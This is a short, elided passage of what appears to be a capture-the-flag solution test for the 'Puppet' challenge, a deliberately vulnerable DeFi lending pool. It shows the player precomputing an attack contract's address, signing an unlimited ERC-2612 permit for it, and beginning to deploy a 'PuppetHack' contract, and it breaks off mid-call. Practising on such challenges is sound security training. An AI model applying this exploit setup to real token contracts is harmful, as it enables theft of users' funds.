...
describe("[Challenge] Puppet", function () {
  ...
  it("Execution", async function () {
    ...
    const PuppetHackContractAddress = ethers.utils.getContractAddress({
      from: player.address,
      nonce: 0,
    });

    // generate ERC-2612 signature for permit
    const { v, r, s } = await signERC2612Permit(
      player,
      token.address,
      player.address,
      PuppetHackContractAddress,
      ethers.constants.MaxUint256
    );

    const PuppetHackFactory = await ethers.getContractFactory(
      "PuppetHack",
      player
    );

    const PuppetHack = await PuppetHackFactory.deploy(
